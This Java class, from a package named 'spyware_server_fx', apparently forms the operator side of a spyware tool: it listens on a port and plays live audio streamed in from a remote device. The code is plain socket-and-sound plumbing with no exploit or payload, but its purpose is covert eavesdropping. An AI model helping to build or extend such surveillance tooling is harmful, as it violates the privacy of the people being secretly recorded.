package com.example.spyware_server_fx;

import javax.sound.sampled.*;
import java.io.DataInputStream;
import java.net.ServerSocket;
import java.net.Socket;

public class AudioReceiver{

    Thread thread;
    public int port;
    public ServerSocket serverSocket;
    CmdController cmdController;
    public AudioReceiver(int port , CmdController cmdController){
        this.port = port;
        this.cmdController = cmdController;
    }


    public void startReceiving(){
        thread = new Thread(new Runnable() {
            @Override
            public void run() {
                stopReceiving();
                try{
                    Thread.sleep(500);
                }
                catch (Exception e){
                    System.out.println(e.getMessage());
                }
                try {
                    // Set up audio format
                    AudioFormat format = new AudioFormat(44100, 16, 2, true, true);

                    // Set up the data line info
                    DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);
                    if (!AudioSystem.isLineSupported(info)) {
                        System.out.println("Audio line not supported");
                        return;
                    }

                    // Open the audio line for playing
                    SourceDataLine line = (SourceDataLine) AudioSystem.getLine(info);
                    line.open(format);
                    line.start();

                    // Start the server socket
                    serverSocket = new ServerSocket(port);
                    System.out.println("Waiting for incoming audio stream...");

                    Socket clientSocket = serverSocket.accept();
                    cmdController.isAudioRunning = true;
                    DataInputStream inputStream = new DataInputStream(clientSocket.getInputStream());

                    System.out.println("Streaming audio playback started...");

                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    while (cmdController.isAudioRunning) {
                        bytesRead = inputStream.read(buffer);
                        line.write(buffer, 0, bytesRead);
                    }

                    line.drain();
                    line.stop();
                    line.close();

                } catch (Exception e) {
                    e.printStackTrace();
                }
                finally {
                    System.out.println("[AudioReceiver] Clsoing all sockets");
                    try {
                        serverSocket.close();
                    }
                    catch (Exception e){
                        System.out.println("[AudioReceiver] Failed to close server socket");
                        System.out.println(e.getMessage());
                    }
                }
            }
        });
        thread.start();

    }
    public void stopReceiving() {
        cmdController.isAudioRunning = false;
    }
}

